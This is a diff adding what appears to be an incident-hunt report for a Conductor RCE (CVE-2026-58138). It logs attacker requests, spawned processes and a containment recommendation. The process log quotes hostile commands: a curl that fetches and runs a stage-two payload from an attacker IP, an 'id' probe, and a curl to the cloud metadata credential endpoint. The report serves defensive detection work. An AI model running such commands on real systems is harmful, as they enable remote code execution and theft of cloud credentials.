@@ -1,0 +1,30 @@
+====================================================================
+ GraySentinel DSOU | Day 1 - Conductor RCE Hunt (CVE-2026-58138)
+====================================================================
+
+[MISSION] API-layer exploitation attempts: 2 found
+  [!] 2026-09-20T09:14:52Z src=45.146.130.77 (EXTERNAL) /api/metadata/workflow status=200
+      UA=python-requests/2.31 :: workflow definition with evaluator task + OS-command pattern
+  [!] 2026-09-20T13:47:19Z src=185.220.101.9 (EXTERNAL) /api/metadata/workflow status=200
+      UA=curl/8.2.1 :: workflow definition with evaluator task + OS-command pattern
+
+[MISSION] Host-layer suspicious process spawns: 3 found
+  [CRITICAL] 2026-09-20T09:15:09Z conductor-pod-1 child=/bin/sh user=conductor
+      cmd: sh -c curl http://45.146.130.77/s ; sh stage2
+      -> Conductor JVM spawned shell/network binary
+  [CRITICAL] 2026-09-20T13:47:20Z conductor-pod-1 child=/bin/sh user=conductor
+      cmd: sh -c id
+      -> Conductor JVM spawned shell/network binary
+  [CRITICAL] 2026-09-20T09:20:15Z conductor-pod-1 child=/usr/bin/curl user=conductor
+      cmd: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+      -> Conductor JVM spawned shell/network binary -> cloud metadata/credential theft attempt
+
+[CORRELATION]
+  [CONFIRMED] External evaluator payload submission + subsequent JVM
+             process spawn. Attacker IP(s): 185.220.101.9, 45.146.130.77
+  VERDICT: Pre-patch exploitation likely. Answer to 'close incident?' = NOT YET.
+  NEXT: isolate pod, preserve, rotate ALL engine-reachable credentials
+        (cloud role FIRST - metadata endpoint access observed).
+
+MITRE ATT&CK: T1190, T1059, T1552.005
+Done.
